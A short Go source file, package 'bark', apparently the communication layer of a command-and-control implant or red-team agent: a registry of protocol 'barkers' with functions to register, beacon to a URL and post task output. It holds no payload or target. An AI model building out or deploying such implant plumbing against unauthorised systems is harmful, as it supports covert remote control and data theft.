package bark

type barker interface {
	beaconOut(string) ([]byte, error)
	postOutput(string, []byte) ([]byte, error)
}

var (
	Barkers = make(map[string]barker)
)

func init() {

}

// Beacon out over the current valid protocol.
func Register(name string, url string) ([]byte, error) {
	var body []byte
	var err error

	body, err = Barkers[name].beaconOut(url)
	return body, err

}

// Beacon out over the current valid protocol.
func Beacon(name string, url string) ([]byte, error) {
	var body []byte
	var err error

	body, err = Barkers[name].beaconOut(url)
	return body, err

}

// send output over the current valid protocol.
func PostOut(name string, url string, taskdata []byte) ([]byte, error) {

	var err error

	body, err := Barkers[name].postOutput(url, taskdata)
	return body, err

}
